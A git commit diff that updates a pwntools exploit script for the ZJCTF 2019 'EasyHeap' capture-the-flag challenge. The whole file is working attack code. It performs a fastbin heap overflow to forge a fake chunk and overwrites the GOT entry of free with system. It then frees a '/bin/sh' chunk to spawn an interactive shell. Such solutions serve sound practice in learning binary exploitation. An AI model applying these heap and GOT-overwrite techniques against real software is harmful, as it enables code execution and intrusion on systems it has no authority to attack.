e86f7e7b0ebfe41c190b473727059b68e2ed69b2
SnowMzn <1318173803@qq.com>
2021-08-13 00:28:19 +0800

    update easyheap

--- [ZJCTF 2019]EasyHeap/exp.py
+++ [ZJCTF 2019]EasyHeap/exp.py
@@ -1,32 +1,41 @@
 from pwn import *
 
 p = process("./easyheap")
-elf = ELF("./easyheap")
+elf = ELF("easyheap")
 
-def create(size, content):
-    p.sendlineafter('choice :', str(1))
-    p.sendlineafter('Heap :', str(size))
-    p.sendafter('heap:', content)
+def create(size, payload):
+    p.sendlineafter("choice :", str(1))
+    p.sendlineafter("Heap : ", str(size))
+    p.sendlineafter("heap:", payload)
 
-def edit(idx, size, content):
-    p.sendlineafter('choice :', str(2))
-    p.sendlineafter('Index :', str(idx))
-    p.sendlineafter('Heap :', str(size))
-    p.sendafter('heap :', content)
-    
+def edit(idx, payload):
+    p.sendlineafter("choice :", str(2))
+    p.sendlineafter("Index :", str(idx))
+    p.sendlineafter("Heap : ", str(len(payload)+1))
+    p.sendlineafter("heap : ", payload)
+
 def delete(idx):
-    p.sendlineafter('choice :', str(3))
-    p.sendlineafter('Index :', str(idx))
+    p.sendlineafter("choice :", str(3))
+    p.sendlineafter("Index :", str(idx))
 
-create(0x68, b'woaini') # 0
-create(0x68, b'a') # 1
-create(0x68, b'a') # 2
+create(0x60, b"A")
+create(0x60, b"A")
+create(0x60, b"A")
+
 delete(2)
-edit(1, 0x78, b'/bin/sh'.ljust(0x68, b'\x00') + p64(0x71) + p64(0x6020ad))
-create(0x68, b'b') # 2
-create(0x68, b'b') # 3 fake_chunk
-edit(3, 0x2b, b'c' * 0x23 + p64(elf.got['free']))
-edit(0, 0x8, p64(elf.plt['system']))
-delete(1)
+
+payload = p64(0) * 13 + p64(0x71) + p64(0x6020ad)
+edit(1, payload)
+
+create(0x60, b"/bin/sh\x00")
+create(0x60, b"A")
+
+payload = b"A" * 3 + p64(0) * 4 + p64(elf.got["free"])
+edit(3, payload)
+
+payload = p64(elf.plt["system"])
+edit(0, payload)
+
+delete(2)
 
 p.interactive()
